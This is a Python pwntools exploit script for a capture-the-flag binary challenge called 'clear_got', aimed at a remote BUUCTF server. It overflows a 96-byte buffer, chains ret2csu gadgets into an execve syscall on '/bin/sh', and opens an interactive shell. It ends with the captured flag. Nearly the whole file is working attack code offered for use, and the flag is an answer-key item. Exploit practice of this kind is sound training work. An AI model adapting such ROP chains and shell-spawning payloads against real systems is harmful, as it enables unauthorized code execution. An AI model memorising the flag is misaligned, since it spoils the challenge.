#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './clear_got'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

local = 0
if local:
    p = process(challenge)
else:
    p = remote('node4.buuoj.cn', '29076')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 0
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

__libc_start_main_got = elf.got['__libc_start_main']
sys_write = 0x400777
sys_ret = 0x40077E
pop_rdi = 0x4007f3
pop_rsi_r15 = 0x4007f1
bss_addr = 0x601060

csu1 = 0x4007EA
csu2 = 0x4007D0
rbx = 0
rbp = 1
r12_func = 0x600E50
r15_edi = 0
r14_rsi = bss_addr
r13_rdx = 59

csu_chain = flat(
    csu1,rbx,rbp,r12_func,
    r13_rdx,r14_rsi,r15_edi,csu2,p64(0),rbx,rbp,bss_addr+0x8,0,0,bss_addr,sys_ret,csu2
)

# ret_chain = flat(
#     pop_rdi, 0,
#     pop_rsi_r15, bss_addr,0,
#     sys_ret,
# )# 59
payload = 96*b'a' + p64(0) + csu_chain
p.recvuntil('competition.///\n')
# debug()
p.send(payload)

payload2 = b'/bin/sh\x00'+p64(sys_ret)
payload2 = payload2.ljust(59,b'\x00')
p.send(payload2)

p.interactive()
#* flag{279c466f-9142-4650-93f9-a834fd23cffc}
